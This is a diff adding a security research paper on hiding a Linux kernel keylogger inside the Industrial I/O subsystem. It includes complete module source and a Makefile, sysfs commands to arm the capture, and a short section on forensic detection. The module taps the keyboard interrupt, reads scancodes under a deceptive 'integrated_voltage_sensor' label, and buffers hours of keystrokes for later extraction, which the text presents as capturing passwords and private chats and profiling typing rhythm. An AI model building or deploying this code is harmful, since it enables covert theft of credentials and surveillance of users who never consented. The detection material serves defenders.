@@ -1,0 +1,763 @@
+---
+title: Semantic Abuse of the Linux IIO Subsystem
+author: Salah Triki
+---
+|=-----------------------------------------------------------------------=|
+|=------------=[ Semantic Abuse of the Linux IIO Subsystem ]=------------=|
+|=-----------=[ A Case Study in Kernel Telemetry Blind Spots ]=----------=|
+|=-----------------------------------------------------------------------=|
+|=---------------=[ Salah Triki <salah.triki@gmail.com> ]=---------------=|
+|=-----------------------------------------------------------------------=|
+
+--[ Table of Contents
+0. INTRODUCTION: THE SEMANTIC VACUUM
+1. INDUSTRIAL I/O: THE PERFECT SHADOW CONDUIT
+   1.0. Architectural Components
+   1.1. The Semantic Blind Spot
+   1.2. High-Resolution Determinism
+2. CULVERTING THE INTERRUPT: FROM SCANCODES TO VOLTAGE 
+   2.0. The Core Mechanism: Bridging IRQ to IIO Buffers 
+   2.1. DATA HARVESTING: THE TRIGGER HANDLER ANATOMY
+   2.2. CHANNEL SPECIFICATION: SEMANTIC MASKING 
+   2.3. Bypassing the "Input" Audit
+3. ARMING THE TRAP: USER-SPACE ACTIVATION
+   3.0. Enabling the Data Channels 
+   3.1. Coupling the Trigger 
+   3.2. Opening the Floodgates 
+   3.3. Silent Extraction
+   3.4. Persistence and Deferred Semantic Exfiltration
+4. BEYOND KEYLOGGING: HIGH-PRECISION BIOMETRICS
+   4.0. The Temporal Signature
+   4.1. Data Structure and Analysis
+   4.2. The "Oscilloscope" Effect
+5. FORENSIC ARTIFACTS: TRACING THE SHADOW SENSOR 
+   5.0. IRQ Vector Squatting
+   5.1. Behavioral Entropy and Duty Cycles
+   5.2. Toward Semantic Validation
+6. CONCLUSION
+APPENDIX A : vmon_iio.c
+APPENDIX B : Makefile
+   
+--[ 0. INTRODUCTION: THE SEMANTIC VACUUM
+
+The evolution of Linux kernel security has been a relentless arms race
+focused almost exclusively on the Control Plane. We have fortified the
+fortress with LSMs, fine-grained syscall auditing, and sophisticated memory
+protections like KASLR and stack cookies.  In this landscape, a traditional
+rootkit attempting to hook sys_read or hijack a file operation is akin to a
+burglar trying to break into a bank through the front door while the cameras
+are rolling.
+
+However, security is not merely about controlling execution; it is about the
+interpretation of data flows.
+
+The Industrial I/O (IIO) subsystem, designed to handle high-speed telemetry
+from sensors (accelerometers, ADCs, light sensors), operates in a
+specialized "industrial zone" of the kernel. It is a world of triggers,
+buffers, and raw bitstreams-a world that has remained largely invisible to
+the security community. Because IIO data is semantically labeled as
+"telemetry" rather than "user input," it escapes the scrutiny of traditional
+input-layer monitoring.
+
+This paper explores the "Semantic Abuse" of the IIO framework. We
+demonstrate how an attacker can repurpose this legitimate telemetry pipeline
+to create a high-precision, nanosecond-stable exfiltration channel. By
+masking a keystroke logger as a virtual voltage sensor, we exploit a
+fundamental blind spot in kernel telemetry: the system's inability to
+distinguish between the physical oscillations of a hardware sensor and the
+scancodes of a terminal session.
+
+We will dissect the architecture of IIO, demonstrate the weaponization of
+IRQF_SHARED for silent interrupt tapping, and show how the framework's
+native kfifo buffers can be used to bypass existing audit solutions. In
+doing so, we challenge the assumption that "industrial" data is inherently
+benign, revealing a stealthy path for persistence that has been hidden in
+plain sight within the kernel’s own bureaucracy.
+
+By injecting keyboard scan codes into a data stream masquerading as benign
+voltage monitoring, we achieve three critical objectives:
+
+- Stealth via False Flagging: Data exfiltration to user space is perceived
+ as legitimate hardware sampling. To an admin, /dev/iio:device0 is just a
+ sensor; to us, it is a high-speed leak.  I call this "Semantic Abuse": the
+ art of staying within the bounds of the API while subverting its
+ fundamental purpose. When applied to the core of the operating system, this
+ Kernel Semantic Abuse turns trusted frameworks into silent adversaries.
+
+- Deterministic Precision: Unlike methods subject to scheduler-induced
+ jitter, IIO’s triggering mechanism allows for nanosecond-accurate capture.
+ This is the gold standard for Keystroke Dynamics (biometric
+ fingerprinting), allowing us to identify users based on their unique typing
+ "rhythm."
+
+- Audit Evasion: By operating within the confines of industrial telemetry,
+ we exploit the inherent trust the kernel places in its own
+ hardware-monitoring frameworks.
+
+Welcome to the blind spot of modern kernel forensics, where the most
+sensitive data flows through the most trusted-and ignored-subsystems.
+
+--[ 1. INDUSTRIAL I/O: THE PERFECT SHADOW CONDUIT
+
+The IIO subsystem was merged into the mainline kernel to provide a unified
+interface for sensors that don't fit into the "input" or "hwmon" categories.
+While the security community was busy hardening the input stack to prevent
+keylogging, the IIO framework grew into a complex, high-performance
+telemetry engine—perfectly suited for data exfiltration.
+
+--[ 1.0. Architectural Components
+
+To understand why IIO is an ideal carrier, one must look at its core
+components:
+
+- Channels: These represent the data points (e.g., voltage, acceleration).
+ In our hijacking scenario, we define a "voltage" channel that actually
+ carries 8-bit keyboard scan codes.
+
+- Triggers: These are the events that tell the system to take a sample. IIO
+ supports hardware triggers. By linking our buffer capture to a "trigger"
+ (which we hook to IRQ1), we ensure that every keystroke creates a discrete,
+ time-stamped entry.
+
+- Buffers (KFIFO): IIO uses optimized ring buffers. Once a sample is taken,
+ it is pushed into a kfifo. This allows the attacker to accumulate
+ keystrokes in kernel space and read them in "bursts," reducing the
+ frequency of context switches and making the process execution pattern look
+ like legitimate sensor polling.
+
+--[ 1.1. The Semantic Blind Spot
+
+The primary reason IIO serves as a perfect shadow conduit is the lack of
+semantic analysis by security tools.  When a process reads from
+/dev/input/event0, an audit tool knows exactly what is happening: user input
+is being captured.  However, when a process reads from /dev/iio:device0, the
+data is seen as a raw stream of integers representing physical phenomena.
+Security policies are rarely tuned to monitor the "voltage" of a CPU or the
+"ambient light" levels for sensitive data. By labeling our keylogger as a
+"Power Management Telemetry" device for example, we operate in a zone where
+the data is considered "low-risk" by the system's defensive logic. This is
+the essence of Kernel Semantic Abuse: exploiting the metadata lie to bypass
+the security stack.
+
+--[ 1.2. High-Resolution Determinism
+
+Standard keyloggers often rely on the gettimeofday or ktime_get calls at the
+moment the log is written. In a busy system, the delay between the hardware
+interrupt and the timestamping (jitter) can vary by several milliseconds.  
+
+IIO solves this. Its internal iio_pollfunc_store_time() function captures
+the time at the earliest possible moment in the interrupt path. This
+provides us with:
+
+- Dwell Time: The exact duration a key is held.
+
+- Inter-keystroke Gap: The nanosecond-precise flight time between
+ characters.
+
+This level of detail is irrelevant for a basic password stealer but is the
+"holy grail" for Keystroke Biometrics, allowing an attacker to build a
+unique behavioral profile of the victim that survives even if they change
+their password.
+
+--[ 2. CULVERTING THE INTERRUPT: FROM SCANCODES TO VOLTAGE 
+
+To turn the IIO framework into a surveillance tool, we must bridge the gap
+between the legacy PS/2 controller (i8042) and the modern IIO ring buffer.
+The goal is to snoop on scan codes without the legitimate driver (atkbd.c)
+or the user ever realizing there is a second passenger on the bus.
+
+--[ 2.0. The Core Mechanism: Bridging IRQ to IIO Buffers 
+
+To achieve stealthy data exfiltration, we must link the hardware interrupt
+(IRQ1) to the IIO ring buffer without disrupting the system's normal
+behavior. This is achieved through a three-stage architectural hijacking. 
+
+a. The Pipe Construction (Buffered Setup)
+
+ret = devm_iio_triggered_buffer_setup(&pdev->dev, indio_dev,
+                  &iio_pollfunc_store_time, vmon_trigger_handler, NULL);
+
+This instruction initializes the kernel's circular FIFO (the buffer).
+iio_pollfunc_store_time is a critical high-precision hook. It captures the
+nanosecond-accurate timestamp at the very moment the interrupt is
+intercepted, ensuring that our Keystroke Dynamics analysis remains
+laboratory-grade.
+vmon_trigger_handler  is our custom "harvester". Once the kernel has handled
+the timing, it invokes this function to read the raw scancode from port 0x60
+and push the resulting 16-byte packet (1 byte scancode + 7 bytes padding +
+8 bytes timestamp) into the circular buffer.  The use of the devm_ variant
+ensures that all buffer resources are automatically reclaimed upon module
+unloading, leaving no residual memory footprints-essential for any "clean"
+operation. 
+
+b. The Invisible Clock (Trigger Allocation)
+
+st->trig = devm_iio_trigger_alloc(&pdev->dev, "kbd_vmon_trig"); 
+
+In the IIO subsystem, a trigger acts as the heartbeat of data acquisition.
+Here, we allocate a software trigger that serves as a logical bridge. It
+doesn't monitor a physical clock; instead, it waits for a signal to tell the
+buffer: "Capture the state now." 
+
+c.  The Hook (IRQ Hijacking) 
+
+ret = devm_request_irq(&pdev->dev, 1, iio_trigger_generic_data_rdy_poll,
+                       IRQF_SHARED, "integrated_voltage_sensor", st->trig);
+
+This is the "Point of No Return." We request access to IRQ 1 (the i8042
+keyboard controller).
+
+IRQF_SHARED: This flag is vital. It allows our driver to "squat" on the
+interrupt line alongside the legitimate keyboard driver (atkbd.c). Both
+handlers will be called, but ours remains silent to the user.
+
+iio_trigger_generic_data_rdy_poll: Instead of a custom function, we use this
+built-in kernel helper to immediately pulse our trigger (Step 2) as soon as
+a key is pressed.
+
+The Camouflage: By naming the requester "integrated_voltage_sensor", we
+ensure that any administrator auditing /proc/interrupts will see a seemingly
+harmless power-management sensor sharing the line with the keyboard.
+
+Together, these instructions create a reactive chain: the hardware interrupt
+fires, the IIO trigger pulses, and our handler silently dumps the keystroke
+and its nanosecond timestamp into the IIO device node, ready for extraction
+via /dev/iio:device0.  
+
+--[ 2.1. DATA HARVESTING: THE TRIGGER HANDLER ANATOMY
+
+Once the IRQ line fires and the trigger is pulled, the execution flow enters
+the Trigger Handler. Unlike a traditional interrupt service routine (ISR)
+that might process data in a "top-half" context, our handler operates in a
+threaded context provided by the IIO framework. This ensures that our I/O
+operations do not stall the CPU's primary interrupt path.
+
+The Harvesting Logic:
+
+static irqreturn_t vmon_trigger_handler(int irq, void *p)
+{
+   struct iio_poll_func *pf = p;
+   struct iio_dev *indio_dev = pf->indio_dev;
+   struct vmon_data_sample data;
+
+
+   /* Zero out the structure to prevent leaking kernel stack memory */
+   memset(&data, 0, sizeof(data)); 
+	
+   data.scancode = inb(KBD_DATA_REG); // Fetch keyboard character 
+
+   /** Push the complete sample (data + timestamp) to the IIO buffers.
+    * Note: Using iio_push_to_buffers_with_timestamp for compatibility.  */
+
+   iio_push_to_buffers_with_timestamp(indio_dev, &data, pf->timestamp);
+
+   iio_trigger_notify_done(indio_dev->trig); 
+
+   return IRQ_NONE;
+}
+
+Technical Breakdown:
+
+a. Low-Level Infiltration (inb): The handler performs a raw port I/O read
+using inb(KBD_DATA_REG). By accessing the 0x60 port directly, we bypass the
+entire Input Subsystem of the kernel. We are grabbing the scancode at the
+lowest possible software level, before any TTY mapping or console processing
+occurs.
+
+b. Top-Half/Bottom-Half Synchronization: A critical feature of this
+implementation is the use of pf->timestamp. This value is not generated
+inside the handler; it is captured by the top-half (iio_pollfunc_store_time)
+at the exact microsecond the hardware interrupt occurred. By decoupling the
+event time from the data processing time, we preserve the "jitter-free"
+integrity of the keystroke timing, which is essential for advanced biometric
+profiling.
+
+c. The IIO Push Mechanism: The call to iio_push_to_buffers_with_timestamp is
+where the "shadow" exfiltration happens. The data structure, which contains
+our 8-bit scancode and 64-bit timestamp, is pushed into the IIO ring buffer.
+The framework automatically handles the memory alignment and the atomic
+insertion into the kfifo, making the data immediately available to the
+/dev/iio:device0 character device.
+
+d. Stealthy Completion (IRQ_NONE): Returning IRQ_NONE is a tactical choice.
+Since we are "sharing" the IRQ line with the legitimate i8042 driver, we let
+the kernel know that we didn't "consume" the interrupt.  This allows the
+official driver to receive the signal right after us, ensuring the keyboard
+continues to function normally. The victim never notices the millisecond of
+latency introduced by our shadow probe.  
+
+--[ 2.2. CHANNEL SPECIFICATION: SEMANTIC MASKING 
+
+The core of our stealth lies in the iio_chan_spec structure. By defining our
+keyboard sniffer as a standard industrial sensor, we leverage the kernel's
+own infrastructure to format and transport our stolen data.
+
+The Channel Configuration:
+
+static const struct iio_chan_spec vmon_channels[] = {
+{ 
+   .type = IIO_VOLTAGE,
+   .indexed = 1,
+   .channel = 0,
+   .info_mask_separate = BIT(IIO_CHAN_INFO_RAW),
+   .scan_index = 0,
+   .scan_type = { 
+      .sign = 'u',
+      .realbits = 8,
+      .storagebits = 8,
+   }, 
+},
+   IIO_CHAN_SOFT_TIMESTAMP(1),
+};
+
+Architectural Subversion:
+
+a. Type Camouflage (IIO_VOLTAGE): We deliberately misclassify the keyboard
+scancodes as Voltage readings. To any monitoring tool or sysfs-explorer, the
+device appears as a benign Analog-to-Digital Converter (ADC). This choice is
+tactical: voltage fluctuations are expected in industrial environments,
+making the constant stream of "samples" (which are actually keystrokes) look
+like hardware telemetry.  
+
+b. Scan Indices and Ordering: 
+- scan_index = 0: Assigns the scancode as the first element in the binary
+ burst.
+- IIO_CHAN_SOFT_TIMESTAMP(1): This macro appends a 64-bit nanosecond
+ timestamp at index 1.  By defining these indices, we instruct the IIO core
+ to construct a composite data frame for every interrupt, creating a
+ deterministic 16-byte packet (following natural alignment) for each key
+ event.
+
+c. Data Representation (scan_type): 
+- realbits = 8: Since standard AT scancodes fit within a single byte, we
+ define the effective width as 8 bits.
+- storagebits = 8: We set the storage width to match. However, due to the
+ subsequent 64-bit timestamp, the kernel's alignment requirements will force
+ the insertion of 7 bytes of padding between the scancode and the timestamp
+ to ensure the u64 starts on an 8-byte boundary. 
+
+d. The Information Mask: By setting .info_mask_separate =
+BIT(IIO_CHAN_INFO_RAW), we create a standard sysfs entry (in_voltage0_raw).
+This provides a "legal" front for the device: if an administrator reads this
+file, they will only see a single integer (the last scancode), effectively
+hiding the high-speed buffered stream occurring in the background. 
+
+This configuration transforms the IIO subsystem into a high-performance,
+timestamp-aware keylogging engine, all while maintaining the appearance of a
+standard industrial driver.
+
+--[ 2.3. Bypassing the "Input" Audit
+
+The beauty of this implementation is that it never calls input_report_key().
+Because we stay entirely within the IIO subsystem: /proc/bus/input/devices
+remains unchanged.  libinput debug-events shows nothing.  The data is only
+accessible by reading the raw IIO character device, which is almost never
+monitored by standard Desktop or Server security suites.
+
+--[ 3. ARMING THE TRAP: USER-SPACE ACTIVATION
+
+Loading the module is only the first phase. To begin the silent collection
+of keystrokes, the attacker must interface with the sysfs hierarchy to
+configure the IIO routing. The following sequence of commands transitions
+the driver from a passive state to an active surveillance engine.  
+
+--[ 3.0. Enabling the Data Channels 
+
+# echo 1 > /sys/bus/iio/devices/iio:device0/scan_elements/in_voltage0_en
+# echo 1 > /sys/bus/iio/devices/iio:device0/scan_elements/in_timestamp_en
+
+
+By default, IIO channels are disabled to optimize the bus. These commands
+instruct the kernel to include both the hijacked Voltage channel (our
+scancodes) and the Timestamp in the scan mask. This configuration dictates
+the structure of the binary packet that will be pushed into the kfifo
+buffer.
+
+--[ 3.1.  Coupling the Trigger 
+
+# echo kbd_vmon_trig > /sys/bus/iio/devices/iio:device0/trigger/current_trigger
+
+This is the most critical step in the routing logic. We are "cabling" the
+hardware interrupt signal to the IIO buffer. By writing our trigger name to
+current_trigger, we establish a direct link: every time IRQ 1 fires, it will
+now trigger a sample capture in our IIO device. Without this link, the IRQ
+would fire, but the IIO buffer would remain empty. 
+
+--[ 3.2. Opening the Floodgates 
+
+# echo 1 > /sys/bus/iio/devices/iio:device0/buffer/enable
+
+This final command allocates the internal kernel buffer (kfifo) and enables
+the data stream. At this point, the "Shadow Sensor" is live. Any activity on
+the physical keyboard is now being transparently duplicated, timestamped,
+and streamed into /dev/iio:device0.
+
+--[ 3.3. Silent Extraction
+
+Once armed, the exfiltration is as simple as reading the raw device: 
+
+# hexdump -C /dev/iio:device0
+
+Because we are using the IIO framework, this read operation is extremely
+efficient. The kernel handles the context switching and the data transport,
+leaving a minimal footprint on the system's process accounting. 
+
+--[ 3.4. Persistence and Deferred Semantic Exfiltration
+
+One of the most lethal characteristics of the Semantic Abuse pattern is its
+ability to act as a silent, high-capacity black box within the kernel's
+memory space. By leveraging the native IIO ring buffer (kfifo), an attacker
+can decouple the act of interception from the act of exfiltration. Unlike
+traditional keyloggers that require an active process or a suspicious log
+file on disk, our vmon_adc_0 device accumulates scancodes directly into a
+kernel-managed circular buffer.  To transform this "voltage sensor" into a
+long-term surveillance tool capable of storing hours of keystrokes, the
+operator simply needs to tune the buffer's capacity through the sysfs
+interface. A buffer length of 65,536 samples, for instance, consumes a
+negligible 1MB of RAM while providing enough space to record every character
+typed during a full work session.  
+
+Set a high-capacity buffer (65k samples * 16 bytes = 1MB):
+
+# echo 65536 > /sys/bus/iio/devices/iio:device0/buffer/length
+
+Enable the capture:
+
+# echo 1 > /sys/bus/iio/devices/iio:device0/buffer/enable
+
+Once enabled, the driver silently ingests the entropy. An investigator or an
+automated script can then perform a deferred read at any time. Executing a
+simple hexdump -C /dev/iio:device0 will trigger a massive flush of the
+accumulated history, replaying the user’s past activity (passwords, private
+chats, commands) in chronological order. To the system's security monitors,
+this appears as nothing more than a routine telemetry dump from a standard
+industrial ADC.
+
+
+--[ 4. BEYOND KEYLOGGING: HIGH-PRECISION BIOMETRICS
+
+While the theft of clear-text credentials remains a primary objective, the
+true power of the IIO-based sniffer lies in its ability to perform
+high-fidelity behavioral fingerprinting.  By leveraging the deterministic
+nature of industrial triggers, we can move beyond what is being typed to who
+is typing it. 
+
+--[ 4.0. The Temporal Signature
+
+Every human possesses a unique "typing DNA" characterized by micro-rhythms.
+To capture this, two metrics are essential:
+
+- Dwell Time: The duration a specific key is held down (Press to Release).
+
+- Flight Time: The interval between releasing one key and pressing the next
+ (Release to Press).
+
+On a standard system, these intervals are in the range of 50ms to 150ms.
+However, software-based loggers (TTY hooks or input listeners) introduce
+variable latencies due to task scheduling and interrupt coalescing. A 5ms
+jitter might seem negligible, but it introduces enough "noise" to break
+biometric classification models.
+
+The IIO framework is designed for laboratory-grade sensors where timing is
+everything. By using iio_pollfunc_store_time(), we bypass the standard
+jiffies resolution.
+
+When the IRQ1 fires, our shared handler captures a 64-bit nanosecond
+timestamp immediately. Because we are in the top-half of the interrupt, the
+delay between the physical key-switch closure and the timestamp is constant
+(deterministic).
+
+--[ 4.1. Data Structure and Analysis
+
+The output of our IIO buffer provides a structured stream of (Scancode,
+Timestamp) pairs. A typical exfiltration log from /dev/iio:device0 looks
+like this in raw hex:
+
+[Data (8-bit)]            [ Timestamp (64-bit)   ]
+1e 00 00 00 00 00 00 00  e8 26 a4 9b 95 ac 9e 18 (Key 'A' Pressed)
+
+9e 00 00 00 00 00 00 00  25 6a 7d a5 95 ac 9e 18 (Key 'A' Released)
+
+By calculating dT = Treleased - Tpressed, we obtain the Dwell Time. In the
+example above, the 'A' key was held for exactly 165233469$ nanoseconds.
+With this PoC  we can calculate Dwell Time , in nanosecond precision that is
+provided by the IIO subsystem.  This Dwell Time is sufficient to feed
+higher-level biometric engines for: 
+
+- Identify the User: Even if the victim uses a password manager, their
+ "master password" typing rhythm can be compared against a database of known
+ profiles.
+
+- Detect Automation: Scripts or "Paste" operations have zero jitter and
+ perfect intervals. A biometric sniffer can immediately distinguish between
+ a human and an automated process.
+
+--[ 4.2. The "Oscilloscope" Effect
+
+By treating the keyboard as a sensor, we effectively turn the Linux kernel
+into a Security Oscilloscope. We are no longer looking at characters; we are
+looking at the frequency and amplitude of human interaction with the
+hardware. This data is "cleaner" than any output from a standard
+/dev/input/event device because it has been processed by a pipeline
+optimized for signal integrity rather than user-space convenience. We are no
+longer sniffing a keyboard; we are auditing the human nervous system through
+the i8042 controller.
+
+--[ 5. FORENSIC ARTIFACTS: TRACING THE SHADOW SENSOR 
+
+The strength of kernel semantic abuse lies in its compliance with kernel
+integrity; it violates logic, not memory. Traditional rootkit detection
+systems searching for compromised syscall tables or inline hooks will return
+a clean bill of health. However, an investigator who understands the
+kernel's bureaucracy can find the "footprints" of this telemetry parasite. 
+
+Note that the driver resides within the platform bus hierarchy, while the
+device instance is projected into the IIO class, further decoupling the
+logical driver from its telemetry output.
+
+--[ 5.0. IRQ Vector Squatting
+
+While we use IRQF_SHARED to remain non-disruptive, we cannot remain
+invisible in the interrupt accounting system.  
+
+$ cat /proc/interrupts
+ 1:      14205      102 IO-APIC  1-edge    i8042, integrated_voltage_sensor
+
+The "Integrated Voltage Sensor" appears as a secondary handler for IRQ 1. On
+complex SoC architectures, IRQ sharing is common for power management.
+However, on standard x86 workstations, the i8042 controller is almost never
+shared with industrial sensors. An audit of the interrupt affinity and
+handler names remains the most direct method to expose the tap. 
+
+--[ 5.1.  Behavioral Entropy and Duty Cycles
+
+Statistical analysis of the IIO buffer's throughput provides a sophisticated
+detection vector. A legitimate hardware sensor (like a thermistor or a
+voltage rail monitor) typically samples at a constant, deterministic
+frequency. Our shadow sensor, however, is event-driven.  The data stream's
+entropy perfectly mirrors the user's typing bursts. An investigator using
+high-level monitoring tools or eBPF probes would observe a "voltage" that
+only fluctuates during active terminal sessions - a correlation that is
+physically impossible for a genuine motherboard sensor. This temporal
+alignment between the hidden IIO stream and the foreground user activity is
+the ultimate behavioral indicator of compromise.
+
+--[ 5.2. Toward Semantic Validation
+
+The long-term solution to this blind spot is not a signature-based patch,
+but Semantic Validation. Current kernel security models lack a
+"Reasonableness Check" between the data source (IRQ 1) and the data consumer
+(IIO). Until the kernel can enforce a policy that prevents an IIO device
+from requesting a shared interrupt with a Human Interface Device (HID), the
+"Industrial Hijack" remains a viable and stealthy exfiltration strategy.
+
+--[ 6. CONCLUSION
+
+The evolution of the Linux kernel has birthed a double-edged sword. To
+accommodate the explosion of IoT, mobile SoCs, and industrial automation,
+the kernel has integrated highly sophisticated frameworks like IIO. These
+subsystems are engineered for raw performance, deterministic timing, and
+hardware abstraction-the exact primitives required to build a high-speed,
+invisible highway for offensive data exfiltration.  Our exploration into
+this IIO-based shadow channel demonstrates a critical shift in the landscape
+of kernel-level persistence and eavesdropping:
+
+- The Semantic Gap: Security audit solutions suffer from "Framework
+ Fatigue." They are heavily tuned to monitor the highly-scrutinized Input
+ Subsystem (TTY, HID, evdev). By migrating the attack vector to the obscure
+ IIO pipeline, we exploit a semantic blind spot where security tools lose
+ context. To the kernel, we aren't a keylogger; we are a telemetry sensor.
+
+- The Metadata Lie: This case study proves that in a modern OS, data is only
+ as sensitive as its label. By re-labeling keystrokes as "industrial voltage
+ samples," we effectively bypass behavioral analysis engines. We have
+ weaponized the kernel's own abstraction layers to perform Kernel Semantic
+ Abuse, proving that the mechanics of data transport are often ignored if
+ the data's "purpose" appears benign.
+
+- Precision as a Weapon: The ability to extract nanosecond-precise timing
+ via IIO triggers elevates this from a simple sniffer to a biometric
+ extraction tool. In an era where traditional passwords are being replaced
+ by behavioral signals, the IIO framework provides the high-fidelity timing
+ necessary to steal a user's "typing DNA," turning an industrial framework
+ into a tool for fundamental identity theft. 
+
+This architectural blindness is not limited to IIO; the same principles of
+semantic abuse can be extrapolated to any high-performance framework-from
+COMEDI to raw DMA engines-wherever the kernel prioritizes raw throughput
+over semantic oversight. 
+
+We have spent a decade hardening the input stack, while leaving the
+industrial backdoors wide open. The IIO subsystem isn't broken; it's doing
+exactly what it was designed to do: move bits with surgical precision and
+zero context. In this semantic blind spot, our keylogger isn't an intruder;
+it's just a high-fidelity voltage sensor. As long as the kernel prioritizes
+throughput over data-source validation, the 'Industrial Hijack' will remain
+the ultimate shadow conduit.
+
+--[ APPENDIX A : vmon_iio.c
+
+#include <linux/module.h>
+#include <linux/platform_device.h>
+#include <linux/interrupt.h>
+#include <linux/io.h>
+#include <linux/iio/iio.h>
+#include <linux/iio/buffer.h>
+#include <linux/iio/trigger.h>
+#include <linux/iio/trigger_consumer.h>
+#include <linux/iio/triggered_buffer.h>
+
+#define KBD_DATA_REG 0x60 // Standard x86 keyboard I/O port
+
+struct vmon_irq_state {
+    struct iio_trigger *trig;
+};
+
+/* * Scan structure: 8 bits for scancode + padding + 64 bits timestamp.
+ * Alignment is critical for performance and system stability.
+ */
+struct vmon_data_sample {
+    u8 scancode;
+    u8 pad[7]; 
+    s64 ts __aligned(8);
+};
+
+/* Single channel definition hijacking 'voltage' for the scancode */
+static const struct iio_chan_spec vmon_channels[] = {
+    {
+        .type = IIO_VOLTAGE,
+        .indexed = 1,
+        .channel = 0,
+        .info_mask_separate = BIT(IIO_CHAN_INFO_RAW),
+        .scan_index = 0,
+        .scan_type = {
+            .sign = 'u',
+            .realbits = 8,
+            .storagebits = 8,
+        },
+    },
+    IIO_CHAN_SOFT_TIMESTAMP(1),
+};
+
+/* Manual read support (non-buffered access) */
+static int vmon_read_raw(struct iio_dev *indio_dev, struct iio_chan_spec const *chan,
+                         int *val, int *val2, long mask) {
+    if (mask == IIO_CHAN_INFO_RAW) {
+        *val = inb(KBD_DATA_REG); // Direct read from keyboard port
+        return IIO_VAL_INT;
+    }
+    return -EINVAL;
+}
+
+static const struct iio_info vmon_info = { .read_raw = vmon_read_raw };
+
+/* Trigger Handler: The core implementation of the Semantic Abuse */
+static irqreturn_t vmon_trigger_handler(int irq, void *p) {
+    struct iio_poll_func *pf = p;
+    struct iio_dev *indio_dev = pf->indio_dev;
+    struct vmon_data_sample data;
+
+    /* Zero out the structure to prevent leaking kernel stack memory */
+    memset(&data, 0, sizeof(data));
+
+    data.scancode = inb(KBD_DATA_REG); // Fetch keyboard character
+    
+    /* * Push the complete sample (data + timestamp) to the IIO buffers.
+     * Note: Using iio_push_to_buffers_with_timestamp for compatibility.
+     */
+    iio_push_to_buffers_with_timestamp(indio_dev, &data, pf->timestamp);
+
+    iio_trigger_notify_done(indio_dev->trig);
+    return IRQ_NONE;
+}
+
+static int vmon_iio_probe(struct platform_device *pdev) {
+    struct iio_dev *indio_dev;
+    struct vmon_irq_state *st;
+    int ret;
+
+    indio_dev = devm_iio_device_alloc(&pdev->dev, sizeof(*st));
+    if (!indio_dev) return -ENOMEM;
+
+    st = iio_priv(indio_dev);
+    indio_dev->name = "vmon_adc_0";
+    indio_dev->info = &vmon_info;
+    indio_dev->channels = vmon_channels;
+    indio_dev->num_channels = ARRAY_SIZE(vmon_channels);
+    indio_dev->modes = INDIO_DIRECT_MODE;
+
+    /* 1. Triggered buffer setup using devm */
+    ret = devm_iio_triggered_buffer_setup(&pdev->dev, indio_dev, &iio_pollfunc_store_time, 
+                                          vmon_trigger_handler, NULL);
+    if (ret) return ret;
+
+    /* 2. Create the trigger linked to IRQ 1 (Keyboard) */
+    st->trig = devm_iio_trigger_alloc(&pdev->dev, "kbd_vmon_trig");
+    if (!st->trig) return -ENOMEM;
+
+    /* * Shared IRQ registration with a deceptive label.
+     * IRQF_SHARED is required as the standard keyboard driver already owns this IRQ.
+     */
+    ret = devm_request_irq(&pdev->dev, 1, iio_trigger_generic_data_rdy_poll,
+                           IRQF_SHARED, "integrated_voltage_sensor", st->trig);
+    if (ret) return ret;
+
+    ret = devm_iio_trigger_register(&pdev->dev, st->trig);
+    if (ret) return ret;
+
+    indio_dev->trig = iio_trigger_get(st->trig);
+
+    return devm_iio_device_register(&pdev->dev, indio_dev);
+}
+
+static struct platform_driver vmon_iio_driver = {
+    .driver = {
+        .name = "vmon_iio",
+    },
+    .probe = vmon_iio_probe,
+};
+
+static struct platform_device *vmon_pdev;
+
+static int __init vmon_module_init(void)
+{
+    /* 1. Register the driver in the system */
+    int ret = platform_driver_register(&vmon_iio_driver);
+    if (ret) return ret;
+
+    /* 2. Dynamically create the "vmon_iio" platform device */
+    vmon_pdev = platform_device_register_simple("vmon_iio", -1, NULL, 0);
+    if (IS_ERR(vmon_pdev)) {
+        platform_driver_unregister(&vmon_iio_driver);
+        return PTR_ERR(vmon_pdev);
+    }
+
+    return 0;
+}
+
+static void __exit vmon_module_exit(void)
+{
+    /* Unregister device first, then the driver */
+    platform_device_unregister(vmon_pdev);
+    platform_driver_unregister(&vmon_iio_driver);
+}
+
+module_init(vmon_module_init);
+module_exit(vmon_module_exit);
+
+MODULE_AUTHOR("Salah Triki <salah.triki@gmail.com>");
+MODULE_DESCRIPTION("High-precision voltage monitoring driver with shared interrupt support");
+MODULE_LICENSE("GPL");
+
+
+--[ APPENDIX B : Makefile
+
+obj-m += vmon_iio.o
+
+all:
+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+
+clean:
+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+
+|=[ EOF ]=---------------------------------------------------------------=|
